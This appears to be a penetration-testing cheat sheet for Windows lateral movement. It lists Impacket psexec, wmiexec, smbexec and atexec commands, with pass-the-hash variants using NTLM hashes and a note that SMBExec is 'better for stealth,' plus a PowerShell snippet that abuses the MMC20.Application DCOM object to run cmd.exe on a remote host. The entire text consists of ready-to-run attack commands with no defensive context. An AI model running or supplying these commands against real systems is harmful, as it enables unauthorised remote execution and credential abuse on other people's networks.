# PSExec style
impacket-psexec domain/user@TARGET
impacket-psexec -hashes LM:NT domain/user@TARGET

# WMI
impacket-wmiexec domain/user@TARGET
impacket-wmiexec -hashes LM:NT domain/user@TARGET "whoami"

# SMBExec (better for stealth)
impacket-smbexec domain/user@TARGET

# AtExec (schedule task)
impacket-atexec domain/user@TARGET "whoami"

# DCOM (PowerShell)
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","TARGET"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")